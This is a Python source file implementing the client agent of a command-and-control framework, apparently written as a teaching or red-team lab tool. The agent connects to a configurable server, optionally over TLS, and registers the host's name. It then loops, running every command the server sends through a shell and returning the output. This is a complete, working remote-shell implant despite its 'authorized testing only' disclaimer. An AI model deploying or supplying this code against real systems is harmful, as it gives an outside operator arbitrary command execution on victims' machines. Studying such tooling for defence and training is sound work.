"""
C2 Client Implementation

This module implements the command and control client (agent) that:
- Connects to the C2 server
- Registers itself with hostname information
- Receives commands from the server
- Executes commands locally using subprocess
- Sends results back to the server

This is for authorized security testing and educational purposes only.
"""

import socket
import subprocess
import sys
import time
import uuid
import ssl
from datetime import datetime
from typing import Optional, Tuple

# Import common modules
from common import config, protocol


def parse_arguments() -> Tuple[str, int]:
    """
    Parse command-line arguments for server connection details.

    Supports two modes:
    1. No arguments: Use config.py defaults (localhost:4444)
    2. Two arguments: Override with custom host and port

    Usage:
        python client.py                    # Use config defaults
        python client.py <host> <port>      # Override with command-line args

    Returns:
        tuple: (server_host, server_port)

    Examples:
        python client.py
        python client.py 127.0.0.1 4444
        python client.py 192.168.1.100 8080
    """
    if len(sys.argv) == 3:
        # User provided host and port
        server_host = sys.argv[1]
        try:
            server_port = int(sys.argv[2])
        except ValueError:
            print(f"[!] ERROR: Port must be a number, got: {sys.argv[2]}")
            print()
            print("Usage: python client.py [server_host] [server_port]")
            sys.exit(1)

        print(f"[*] Using command-line arguments: {server_host}:{server_port}")
        print()

    elif len(sys.argv) == 1:
        # No arguments, use config defaults
        server_host = config.SERVER_HOST
        server_port = config.SERVER_PORT
        print(f"[*] Using config defaults: {server_host}:{server_port}")
        print()

    else:
        # Invalid number of arguments
        print("Usage: python client.py [server_host] [server_port]")
        print()
        print("Examples:")
        print("  python client.py                    # Use config.py defaults")
        print("  python client.py 127.0.0.1 4444     # Connect to specific server")
        print("  python client.py 192.168.1.100 8080 # Connect to remote server")
        sys.exit(1)

    return server_host, server_port


def display_banner(server_host: str, server_port: int):
    """
    Display the client startup banner with configuration info.

    Args:
        server_host: The C2 server hostname/IP to connect to
        server_port: The C2 server port to connect to
    """
    print("=" * 60)
    print("C2 CLIENT - Command and Control Agent")
    print("=" * 60)
    print(f"Target Server: {server_host}:{server_port}")
    print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Client ID: {socket.gethostname()}")
    print("=" * 60)
    print()


def connect_to_server(server_host: str, server_port: int) -> Optional[socket.socket]:
    """
    Connect to the C2 server with retry logic.

    Attempts to establish a TCP connection to the server.
    Will retry multiple times with exponential backoff on failure.

    Args:
        server_host: The C2 server hostname/IP to connect to
        server_port: The C2 server port to connect to

    Returns:
        socket.socket: Connected socket if successful
        None: If all connection attempts fail
    """
    retry_count = 0
    delay = config.CONNECTION_RETRY_DELAY

    while retry_count <= config.MAX_CONNECTION_RETRIES:
        try:
            print(f"[*] Attempting to connect to {server_host}:{server_port}...")

            # Create TCP socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


            if config.TLS_ENABLED:
                print("[*] TLS enabled. Wrapping socket...")

                # Create an SSL context
                # We tell it to trust the server's certificate (TLS_CERTFILE)
                ssl_context = ssl.create_default_context(
                    cafile=config.TLS_CERTFILE
                )

                # Wrap the socket before connecting
                client_socket = ssl_context.wrap_socket(
                    client_socket,
                    server_hostname=server_host
                )

            # Attempt connection (on the wrapped socket if TLS is on)
            client_socket.connect((server_host, server_port))

            print(f"[+] Connected successfully to {server_host}:{server_port}")
            if config.TLS_ENABLED:
                print(f"[*] TLS Cipher: {client_socket.cipher()[0]}")
            print()

            return client_socket

        except ConnectionRefusedError:
            print(f"[!] Connection refused. Server may not be running.")
            retry_count += 1
        
        
        # Catch SSL errors (e.g., certificate not trusted, protocol mismatch)
        except ssl.SSLError as e:
            print(f"[!] ERROR: TLS connection failed: {e}")
            print("[!] Make sure 'server.crt' is present and trusted.")
            return None
            
        except socket.gaierror:
            print(f"[!] ERROR: Cannot resolve hostname {server_host}")
            return None
        
        except OSError as e:
            print(f"[!] ERROR: Network error - {e}")
            retry_count += 1

        except Exception as e:
            print(f"[!] ERROR: Unexpected error during connection - {e}")
            return None

        # Retry logic
        if retry_count <= config.MAX_CONNECTION_RETRIES:
            print(f"[*] Retrying in {delay} seconds... (Attempt {retry_count}/{config.MAX_CONNECTION_RETRIES})")
            time.sleep(delay)
            delay *= 2 
        else:
            print(f"[!] Maximum retry attempts ({config.MAX_CONNECTION_RETRIES}) reached.")
            return None

    return None


def send_registration(client_socket: socket.socket) -> bool:
    """
    Creates and sends a registration message containing the client's
    hostname and timestamp.

    Args:
        client_socket: The connected socket to the server

    Returns:
        bool: True if registration sent successfully, False otherwise
    """
    try:
        # Get client identifier (hostname)
        client_id = socket.gethostname()

        # Create registration message
        registration_message = {
            'type': 'registration',
            'client_id': client_id,
            'timestamp': datetime.now().isoformat(),
            'auth_token': config.AUTH_TOKEN  # Authentication token
        }

        print(f"[*] Sending registration as: {client_id}")

        # Send registration using protocol
        success = protocol.send_message(client_socket, registration_message)

        if success:
            print("[+] Registration sent successfully")
            print()
            return True
        else:
            print("[!] ERROR: Failed to send registration")
            return False

    except Exception as e:
        print(f"[!] ERROR: Registration failed - {e}")
        return False


def execute_command(command: str) -> Tuple[str, str, int]:
    """
    Execute a shell command locally and capture output.

    Uses subprocess to execute the command with timeout protection.
    Captures both stdout and stderr separately.

    Args:
        command: The shell command to execute

    Returns:
        tuple: (stdout, stderr, return_code)
            - stdout: Standard output as string
            - stderr: Standard error as string
            - return_code: Process exit code (0 = success)
    """
    try:
        # Execute command with timeout and output capture
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=config.COMMAND_TIMEOUT
        )

        # Return captured output and return code
        return result.stdout, result.stderr, result.returncode

    except subprocess.TimeoutExpired:
        # Command exceeded timeout
        error_msg = f"Command timed out after {config.COMMAND_TIMEOUT} seconds"
        return "", error_msg, -1

    except Exception as e:
        # Unexpected error during execution
        error_msg = f"Command execution error: {str(e)}"
        return "", error_msg, -1


def send_result(client_socket: socket.socket, command: str, stdout: str, stderr: str, return_code: int) -> bool:
    """
    Send command execution result back to the server.

    Creates and sends a result message containing the command output,
    errors, and return code.

    Args:
        client_socket: The connected socket to the server
        command: The command that was executed
        stdout: Standard output from the command
        stderr: Standard error from the command
        return_code: Exit code from the command

    Returns:
        bool: True if result sent successfully, False otherwise
    """
    try:
        # Create result message
        result_message = {
            'type': 'result',
            'command': command,
            'stdout': stdout,
            'stderr': stderr,
            'return_code': return_code,
            'timestamp': datetime.now().isoformat()
        }

        # Send result using protocol
        success = protocol.send_message(client_socket, result_message)

        if not success:
            print("[!] WARNING: Failed to send result to server")

        return success

    except Exception as e:
        print(f"[!] ERROR: Failed to send result - {e}")
        return False


def main_loop(client_socket: socket.socket):
    """
    Main command receive and execute loop.

    Continuously waits for commands from the server, executes them,
    and sends results back. Runs until connection is lost or error occurs.

    Args:
        client_socket: The connected socket to the server
    """
    print("=" * 60)
    print("COMMAND LOOP - Waiting for commands from server...")
    print("=" * 60)
    print()

    try:
        while True:
            # Receive command from server
            command_message = protocol.receive_message(client_socket)

            if command_message is None:
                print("[!] ERROR: Connection lost or invalid message received")
                print("[!] Exiting...")
                break

            # Validate message type
            if command_message.get('type') != 'command':
                print(f"[!] WARNING: Unexpected message type: {command_message.get('type')}")
                continue

            # Extract command
            command = command_message.get('command')

            if not command:
                print("[!] WARNING: Received empty command")
                continue

            # Display command being executed
            print(f"[*] Executing command: {command}")

            # Execute the command
            stdout, stderr, return_code = execute_command(command)

            # Display execution summary
            print(f"[*] Command completed with return code: {return_code}")

            # Send result back to server
            success = send_result(client_socket, command, stdout, stderr, return_code)

            if not success:
                print("[!] ERROR: Failed to send result. Connection may be lost.")
                print("[!] Exiting...")
                break

            print()  # Blank line for readability

    except KeyboardInterrupt:
        # Handle Ctrl+C
        print()
        print("[*] Keyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"[!] ERROR: Unexpected error in main loop - {e}")


def main():
    """
    Main entry point for the C2 client.

    Orchestrates the client connection, registration, and command loop.
    Supports command-line arguments for flexible server configuration.
    """
    # Parse command-line arguments (or use config defaults)
    server_host, server_port = parse_arguments()

    # Display banner
    display_banner(server_host, server_port)

    # Connect to server
    client_socket = connect_to_server(server_host, server_port)

    if client_socket is None:
        print("[!] Failed to connect to server. Exiting.")
        sys.exit(1)

    try:
        # Send registration
        success = send_registration(client_socket)

        if not success:
            print("[!] Registration failed. Exiting.")
            client_socket.close()
            sys.exit(1)

        # Enter main command loop
        main_loop(client_socket)

    finally:
        # Cleanup
        print()
        print("[*] Cleaning up...")
        try:
            client_socket.close()
            print("[*] Connection closed")
        except:
            pass

        print("[*] Client shutdown complete")


if __name__ == '__main__':
    main()
